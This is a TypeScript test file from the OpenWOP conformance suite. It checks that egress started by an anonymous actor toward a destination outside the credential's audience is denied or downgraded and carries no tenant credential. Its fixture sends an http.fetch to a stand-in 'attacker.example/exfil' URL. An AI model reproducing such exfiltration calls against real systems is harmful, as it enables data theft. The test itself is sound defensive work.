/**
 * Anonymous-actor SSRF-guarded, credential-safe egress (RFC 0132 §C.3) — backs
 * the `anon-actor-egress-ssrf-guarded` SECURITY invariant (composes RFC 0079
 * `egress-credential-audience-bound`).
 *
 * An anon-initiated egress MUST ride the host's SSRF-guarded, audience-bound
 * egress path (RFC 0076 §B safeFetch + RFC 0079 credential↔destination binding).
 * A host-issued or tenant BYOK credential MUST NOT attach to an anon egress
 * whose destination is not in the credential's provenance `audiences`; the
 * default posture is `downgraded` (anonymous egress, no credential) or `denied`.
 * An anon actor never becomes a confused deputy for a tenant credential.
 *
 * Capability-gated on `capabilities.anonymousActor.supported`; soft-skips when
 * unadvertised or when the reference seam is unwired (404). Hard-fails under
 * `OPENWOP_REQUIRE_BEHAVIOR=true`. Passing non-vacuously graduates
 * `anon-actor-egress-ssrf-guarded` reference-impl → protocol tier.
 *
 * @see RFCS/0132-anonymous-actor-authorization.md §C.3
 * @see RFCS/0079-credential-provenance-and-egress-policy.md
 */

import { describe, it, expect } from 'vitest';
import { behaviorGate } from '../lib/behavior-gate.js';
import { readAnonymousActorCap, anonDispatch } from '../lib/anonymousActor.js';
import { req } from '../lib/requirement-ids.js';
import { softSkip } from '../lib/soft-skip.js';

const PROFILE = 'openwop-anonymous-actor';

describe('anonymous-actor-egress-guarded (RFC 0132 §C.3)', () => {
  it('an out-of-audience anon egress is denied/downgraded and attaches no credential', async () => {
    const cap = await readAnonymousActorCap();
    const supportsWriteEgress = (cap?.tiers ?? []).includes('bounded-write-egress');
    // Gate on the write/egress tier specifically — a read-only host has no egress path here.
    if (!behaviorGate(PROFILE, cap?.supported === true && supportsWriteEgress)) return;
    const res = await anonDispatch({
      tool: 'http.fetch',
      destination: 'https://attacker.example/exfil',
    });
    if (res.status === 404 || res.status === 405) return softSkip('blocked', 'precondition not met — `res.status === 404 || res.status === 405` returned early (seam unwired — soft-skip) (seam, prior step, or fixture unavailable)'); // seam unwired — soft-skip
    const egress = res.json?.egressDecided;
    expect(
      egress,
      req('openwop.it.anonymous-actor-egress-guarded.an-out-of-audience-anon-egress-is-denied-downgraded-and-attaches-no-credential', 'RFC 0132 §C.3', 'an anon egress MUST ride the RFC 0079 egress-decision path'),
    ).toBeDefined();
    expect(
      ['denied', 'downgraded'],
      req('openwop.it.anonymous-actor-egress-guarded.an-out-of-audience-anon-egress-is-denied-downgraded-and-attaches-no-credential', 'RFC 0132 §C.3', 'an out-of-audience anon egress MUST be denied or downgraded — never allowed-with-credential'),
    ).toContain(egress?.decision);
    expect(
      egress?.credentialAttached === true,
      req('openwop.it.anonymous-actor-egress-guarded.an-out-of-audience-anon-egress-is-denied-downgraded-and-attaches-no-credential', 'SECURITY anon-actor-egress-ssrf-guarded', 'no tenant/host credential MUST attach out-of-audience'),
    ).toBe(false);
  });
});
